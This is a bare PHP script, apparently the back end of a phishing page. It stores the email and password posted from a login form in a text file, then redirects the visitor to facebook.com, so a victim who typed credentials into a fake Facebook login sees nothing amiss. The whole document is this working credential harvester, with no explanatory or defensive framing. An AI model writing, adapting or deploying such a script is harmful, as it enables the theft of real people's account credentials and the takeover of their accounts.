<?php

$file = fopen("archivo.txt", "a");
fwrite($file, "Usuario: ".$_POST['email']." : ".$_POST['pass'].PHP_EOL);
fclose($file);

header("Location:http://facebook.com");
?>